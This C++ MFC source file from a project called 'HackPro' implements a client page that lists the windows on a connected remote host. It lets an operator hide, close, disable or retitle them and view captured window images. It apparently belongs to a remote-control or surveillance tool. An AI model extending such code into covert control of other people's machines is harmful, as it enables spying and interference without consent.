// WndList.cpp : implementation file
//

#include "stdafx.h"
#include "hackpro.h"
#include "wndlist.h"
#include "papahead.h"
#include "hackclient.h"

IMPLEMENT_DYNAMIC(CWndList, CPropertyPage)
CWndList::CWndList()
: CPropertyPage(CWndList::IDD)
{

}
CWndList::CWndList(CHackClient* parent)
{
	Papa=parent;
	this->Data=NULL;
}
CWndList::~CWndList()
{
	delete this->Data;
}

void CWndList::DoDataExchange(CDataExchange* pDX)
{
	CPropertyPage::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TREE1, m_Tree);
}


BEGIN_MESSAGE_MAP(CWndList, CPropertyPage)
	ON_NOTIFY(TVN_SELCHANGED, IDC_TREE1, OnTvnSelchangedTree1)
	ON_BN_CLICKED(IDC_BUTTON2, OnBnClickedButton2)
	ON_BN_CLICKED(IDC_BUTTON8, OnBnClickedButton8)
	ON_BN_CLICKED(IDC_BUTTON5, OnBnClickedButton5)
	ON_BN_CLICKED(IDC_BUTTON4, OnBnClickedButton4)
	ON_BN_CLICKED(IDC_BUTTON6, OnBnClickedButton6)
	ON_BN_CLICKED(IDC_BUTTON7, OnBnClickedButton7)
	ON_BN_CLICKED(IDC_REFRESH, OnBnClickedRefresh)
	ON_EN_CHANGE(IDC_FINDTXT, OnEnChangeFindtxt)
	ON_BN_CLICKED(IDC_BTFINDWINDOW, OnBnClickedBtfindwindow)
END_MESSAGE_MAP()


// CWndList message handlers

BOOL CWndList::OnInitDialog()
{
	CPropertyPage::OnInitDialog();
	this->Data=new CWndTree(Papa);
	AfxBeginThread(CWndList::Thread_Init,this);
	return TRUE; 
	
}

void CWndList::OnTvnSelchangedTree1(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMTREEVIEW pNMTreeView = reinterpret_cast<LPNMTREEVIEW>(pNMHDR);
	//=====================THRD
	AfxBeginThread(CWndList::Thread_Add,this); 
	*pResult = 0;
}
void CWndList::SetData(WNode* node)
{
	if(node!=NULL)
	{
		char str[50];
		
		this->SetDlgItemText(IDC_MCAPTION,node->Text);
		
		ltoa(node->WndInfo.cbSize,str,10);
//		this->SetDlgItemText (IDC_MSIZE,str);  
		CString mStr;
		mStr.Format("(%d,%d)-(%d,%d)",node->WndInfo.rcWindow.left,node->WndInfo.rcWindow.top,
			node->WndInfo.rcWindow.right,node->WndInfo.rcWindow.bottom);

		this->SetDlgItemText(IDC_MCORD_W ,mStr);

		mStr.Format("(%d,%d)-(%d,%d)",node->WndInfo.rcClient.left,node->WndInfo.rcClient.top,
			node->WndInfo.rcClient.right,node->WndInfo.rcClient.bottom);

		this->SetDlgItemText(IDC_MCORD_C,mStr);

		this->SetDlgItemText(IDC_MSTYLES ,ltoa(node->WndInfo.dwStyle,str,10));


		this->SetDlgItemText(IDC_MEXSTYLE  ,ltoa(node->WndInfo.dwExStyle,str,10));

		this->SetDlgItemText(IDC_MSTATUS,(node->WndInfo.dwWindowStatus ==WS_ACTIVECAPTION)?"Active":"Inactive");
		mStr.Format("%d-%d",node->WndInfo.cxWindowBorders,node->WndInfo.cyWindowBorders);
		this->SetDlgItemText(IDC_MWIDTH ,mStr);   

		
	}
}
void CWndList::OnBnClickedButton2()
{
	WNode* node =(PWNode)m_Tree.GetItemData(m_Tree.GetSelectedItem());
	Data->WndFunction(node->Hwnd,"",WNDFN_HIDE); 
	//::ShowWindow(node->Hwnd,SW_HIDE); 
}
UINT CWndList::Thread_Init(LPVOID lpParameter)
{
	CWndList* This =(CWndList*)lpParameter;
	This->m_Tree.EnableWindow(false);
	if(This->Data->FillInfo()==0)
	{
		::MessageBox(NULL,"Unable to get list connected host","HackPro(Error)",MB_OK);
		This->m_Tree.EnableWindow(true);
		return TRUE;
	}
	HTREEITEM p =This->m_Tree.InsertItem("DeskTop",0,0);
	for(int i=0;i<This->Data->Root->Children.GetCount();i++)
	{
		char str[128];
		ltoa((long)(This->Data->Root->Children.GetAt(i))->Hwnd,str,10);
		strcat(str,"::");
		strcat(str,(This->Data->Root->Children.GetAt(i))->ClassName);
		HTREEITEM r =This->m_Tree.InsertItem(str,1,1,p);
		This->m_Tree.SetItemData(r,(DWORD_PTR)This->Data->Root->Children.GetAt(i));   

	}
	This->m_Tree.Expand(p,TVE_EXPAND);
	This->m_Tree.EnableWindow(true);
	return 0;
}
UINT CWndList::Thread_Add(LPVOID lpParameter)
{
	CWndList* This =(CWndList*)lpParameter;
	This->m_Tree.EnableWindow(false);
	HTREEITEM si= This->m_Tree.GetSelectedItem();
	PWNode node =(PWNode)This->m_Tree.GetItemData(si);
	if(!This->m_Tree.ItemHasChildren(si)) 
	{
		This->Data->InsertInfo(node);
		for(int i=0;i<node->Children.GetCount();i++)
		{
			char str[128];
			ltoa((long)(node->Children.GetAt(i))->Hwnd,str,10);
			strcat(str,"::");
			strcat(str,node->Children.GetAt(i)->ClassName); 
			HTREEITEM r=NULL;
			r =This->m_Tree.InsertItem(str,1,1,si);
			This->m_Tree.SetItemData(r,(DWORD_PTR)node->Children.GetAt(i));
		}
	}
	if(node!=NULL)
	{
		GetWndBmpReq req;
		req.HWnd=(unsigned long)node->Hwnd;
		req.This=(unsigned long)This;
		
	}
	This->SetData(node);
	This->m_Tree.EnableWindow(true);
	return 0;
}
void CWndList::OnBnClickedButton8()
{
	WNode* node =(PWNode)m_Tree.GetItemData(m_Tree.GetSelectedItem());
	Data->WndFunction(node->Hwnd,"",WNDFN_UNHIDE); 
}

void CWndList::OnBnClickedButton5()
{
	WNode* node =(PWNode)m_Tree.GetItemData(m_Tree.GetSelectedItem());
	Data->WndFunction(node->Hwnd,"",WNDFN_CLOSE); 

}

void CWndList::OnBnClickedButton4()
{
	WNode* node =(PWNode)m_Tree.GetItemData(m_Tree.GetSelectedItem());
	Data->WndFunction(node->Hwnd,"",WNDFN_ENABLE);

}

void CWndList::OnBnClickedButton6()
{
	WNode* node =(PWNode)m_Tree.GetItemData(m_Tree.GetSelectedItem());
	Data->WndFunction(node->Hwnd,"",WNDFN_DISABLE); 
}

void CWndList::OnBnClickedButton7()
{
	char str[20];
	this->GetDlgItemText(IDC_SETCAPTION,str,20);
	WNode* node =(PWNode)m_Tree.GetItemData(m_Tree.GetSelectedItem());
	Data->WndFunction(node->Hwnd,str,WNDFN_SETTEXT);
	
}

void CWndList::OnBnClickedRefresh()
{
	this->m_Tree.DeleteAllItems();
	if(Data!=NULL)
	{
		delete Data;
	}
	this->Data=new CWndTree(Papa);
	AfxBeginThread(CWndList::Thread_Init,this);
}

void CWndList::OnEnChangeFindtxt()
{
	
}

void CWndList::OnBnClickedBtfindwindow()
{
	CString txt;
	this->GetDlgItemText(IDC_FINDTXT,txt);
	CTreeCtrl* pCtrl = &m_Tree;
	HTREEITEM hCurrent=pCtrl->GetSelectedItem();
	if(hCurrent==NULL)
	{
		hCurrent = pCtrl->GetRootItem();
	}
	if(hCurrent==NULL)
	{
		return;
	}
	hCurrent=pCtrl->GetNextItem(hCurrent,TVGN_NEXTVISIBLE);
	while (hCurrent != NULL)
	{
		CString ItemText;
		WNode* node =(PWNode)m_Tree.GetItemData(hCurrent);
		ItemText.Format("%s",node->Text);
		if(ItemText.Find(txt)!=-1)
		{
			pCtrl->Select(hCurrent,TVGN_FIRSTVISIBLE);
			pCtrl->Select(hCurrent,TVGN_CARET);
			break;
		}
		hCurrent=pCtrl->GetNextItem(hCurrent,TVGN_NEXT);
	}
}
void* CWndList::CALLBACK_CaptureWindow(void* data,int size)
{
	int* RetData =new int[2];
	RetData[0]=0;
	RetData[1]=0;
	void* DefaultReturn=(void*)RetData;
	
	//Get the parameters
	WndBmp* param=(WndBmp*)data;
	CWndList* This =(CWndList*)param->This;
	void* pBits=(void*)(((char*)data)+sizeof(WndBmp));
	This->GetDisp(pBits,param->width,param->height);
	return DefaultReturn;
}
void CWndList::GetDisp(void* pBits,int width,int height)
{
	// This functions restores the bitmap from the buffer (Pointed by pBits)
	if(this->bmpdisp!=NULL)
	{
		::DeleteObject((HGDIOBJ)bmpdisp);
	}
	HDC wnddc=::GetDC(this->m_hWnd);
	if(wnddc==NULL)
	{
		this->MessageBox("Error during GetDC()");
		return;
	}
	HDC bmpdc=::CreateCompatibleDC(wnddc);
	if(bmpdc==NULL)
	{
		this->MessageBox("Error during CreateCompatibleDC(wnddc)");
		::ReleaseDC(this->m_hWnd,wnddc);
		return;
	}
	bmpdisp=::CreateCompatibleBitmap(wnddc,width,height);
	if(bmpdisp==NULL)
	{
		this->MessageBox("Error during CreateCompatibleBitmap");
		::ReleaseDC(this->m_hWnd,wnddc);
		::DeleteDC(bmpdc);
		return;
	}
	(HBITMAP)SelectObject(bmpdc,bmpdisp);
	//-----------initialize the bitmap from recieved data-------------
	BITMAPINFOHEADER BmpInfoHeader;
	BmpInfoHeader.biSize = sizeof(BITMAPINFOHEADER);
	BmpInfoHeader.biWidth = width;
	BmpInfoHeader.biHeight=	height;
	BmpInfoHeader.biPlanes =1;
	BmpInfoHeader.biBitCount=24;
	BmpInfoHeader.biSizeImage =0;
	BmpInfoHeader.biXPelsPerMeter=0;
	BmpInfoHeader.biYPelsPerMeter=0;
	BmpInfoHeader.biClrUsed=0;
	BmpInfoHeader.biClrImportant=0;
	BmpInfoHeader.biCompression = BI_RGB;
	
	BITMAPINFO BmpInfo;
	BmpInfo.bmiHeader=BmpInfoHeader;
	RGBQUAD rgbquad;
	rgbquad.rgbBlue=255;
	rgbquad.rgbGreen=255;
	rgbquad.rgbRed=255;
	rgbquad.rgbReserved=0;
	BmpInfo.bmiColors[0]=rgbquad;
	SetDIBits(wnddc,bmpdisp,0,height,pBits,&BmpInfo,DIB_RGB_COLORS);
	SetDIBits(wnddc,bmpdisp,0,height,pBits,&BmpInfo,DIB_RGB_COLORS);
	//----------------------------------------------------------------
	BitBlt(wnddc,0,0,width,height,bmpdc,0,0,SRCCOPY);
	
	::ReleaseDC(this->m_hWnd,wnddc);
	::DeleteDC(bmpdc);	
}
